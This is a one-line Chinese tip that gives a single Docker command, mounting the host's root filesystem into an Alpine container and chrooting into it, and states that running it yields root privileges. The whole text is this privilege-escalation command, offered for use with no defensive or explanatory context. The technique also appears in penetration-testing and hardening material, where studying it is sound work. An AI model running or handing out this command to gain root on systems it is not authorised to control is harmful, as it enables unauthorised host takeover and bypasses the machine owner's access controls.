直接运行命令：

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
即可获取 root 权限
